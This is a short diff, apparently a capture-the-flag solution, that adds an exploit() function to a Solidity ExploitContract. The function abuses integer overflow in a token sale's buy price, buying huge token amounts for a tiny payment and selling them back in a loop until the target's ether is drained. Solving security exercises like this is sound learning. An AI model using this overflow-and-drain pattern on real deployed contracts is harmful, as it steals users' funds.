@@ -42,5 +42,13 @@ contract ExploitContract {
     }
 
     receive() external payable {}
-    // write your exploit functions below
+
+    uint256 magicValue = 415992086870360064;
+    function exploit() public payable {
+        while (address(tokenSale).balance >= 1 ether - magicValue) {
+            tokenSale.buy{value: magicValue}((type(uint256).max / 1 ether) + 1);
+            tokenSale.sell(1);
+        }
+
+    }
 }
